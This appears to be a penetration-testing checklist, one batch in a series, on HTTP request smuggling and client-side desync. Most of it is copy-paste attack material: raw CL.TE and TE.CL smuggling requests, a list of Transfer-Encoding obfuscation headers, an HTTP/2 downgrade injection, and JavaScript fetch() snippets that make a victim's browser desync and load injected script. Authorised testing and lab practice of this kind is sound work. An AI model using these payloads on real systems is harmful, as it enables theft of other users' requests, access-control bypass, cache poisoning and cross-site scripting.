# Batch 07 — HTTP Request Smuggling + Client-Side Desync

## FILL IN

```bash
T="https://TARGET"
```

## GOAL
Finish **2 deep checks** with copy-paste payloads from  
[PayloadsAllTheThings — Request Smuggling](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Request%20Smuggling/README.md).

## TIME
1–2 hours

## YOU NEED
- Target behind reverse proxy / CDN / load balancer (common)
- Burp Repeater with **Update Content-Length = OFF** for TE.CL
- Optional BApp: **HTTP Request Smuggler**
- HTTP/1.1 (smuggling often needs HTTP/1 features)

---

## WHY (30 seconds)

Two servers (front proxy + back app) **disagree** where a request ends.  

| Name | Front uses | Back uses |
|------|------------|-----------|
| **CL.TE** | Content-Length | Transfer-Encoding |
| **TE.CL** | Transfer-Encoding | Content-Length |
| **TE.TE** | both TE, one can be blinded by weird TE header |

You smuggle a **prefix** of the next request. That can poison queues, bypass ACLs, or steal other users’ requests.  

**Client-Side Desync (CSD):** browser sends POST; server ignores body and treats connection wrong; attacker-controlled JS makes victim browser desync.

---

## DO THIS

### 0) Safety / setup

1. Burp Repeater → uncheck **Update Content-Length**.  
2. Prefer raw HTTP/1.1 to origin if CDN allows.  
3. Start with timing / “what time is it” style detection before weaponizing.

Optional automation:

```text
Burp BApp: HTTP Request Smuggler
CLI: https://github.com/defparam/smuggler
```

---

### A) CL.TE — copy paste

> Front: Content-Length · Back: Transfer-Encoding

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

Example (PAT):

```http
POST / HTTP/1.1
Host: TARGET
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

**How to spot:** send twice; second response weird (404 for `GPOST`, timeout, your smuggled path).

---

### B) TE.CL — copy paste

> Front: Transfer-Encoding · Back: Content-Length  

**Must** fix chunk sizes yourself. Include trailing `\r\n\r\n` after final `0`.

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

Example (PAT-style GPOST prefix):

```http
POST / HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
x=1
0


```

(Adjust hex chunk length `5c` to match real byte length of smuggled block.)

---

### C) TE.TE — obfuscate Transfer-Encoding

Send **both** CL and TE, but break one server’s TE parsing with weird headers (PAT list):

```http
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X
Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

Try each form with a CL.TE / TE.CL body until one side ignores TE.

---

### D) HTTP/2 request smuggling (if H2 offered)

If front accepts HTTP/2 and downgrades to HTTP/1.1, smuggle CRLF / CL / TE into H1 translation.

PAT idea — hide H1 request in H2 header value:

```text
:method GET
:path /
:authority TARGET
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: TARGET
```

Use Burp HTTP/2 or specialized tools; confirm with dual responses.

---

### E) Client-Side Desync (CSD)

Some paths ignore POST body and treat as GET → body becomes **next** request.

**Probe idea (PAT):**

```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 37

GET / HTTP/1.1
Host: TARGET
```

**Browser exploit shape (PAT):**

```javascript
fetch('https://TARGET/', {
  method: 'POST',
  body: "GET / HTTP/1.1\r\nHost: TARGET",
  mode: 'no-cors',
  credentials: 'include'
})
```

Richer PAT example (redirect + HEAD + XSS path):

```javascript
fetch('https://TARGET/redirect', {
  method: 'POST',
  body: `HEAD /404/ HTTP/1.1\r\nHost: TARGET\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
  credentials: 'include',
  mode: 'cors'
}).catch(() => {
  location = 'https://TARGET/'
})
```

**Win:** victim navigation gets attacker-controlled response body / script as if from TARGET.

---

### F) Confirm impact (keep ethical)

After desync confirmed:

- Bypass front ACL path  
- Capture victim request (lab only / authorized)  
- Cache poison if applicable  

Document **request bytes** exactly (hex dump if needed).

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| Timeouts / weird double responses | Likely desync — isolate CL.TE vs TE.CL |
| CDN strips TE | Try H2 / different path / origin IP if in scope |
| No proxy chain | Smuggling may not apply — note N/A |

---

## NEXT
→ [08-websocket-xpath-ldap-csv.md](./08-websocket-xpath-ldap-csv.md)

## Reference

- Full writeup source: [PayloadsAllTheThings Request Smuggling](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Request%20Smuggling/README.md)  
- PortSwigger labs linked from that page (practice)
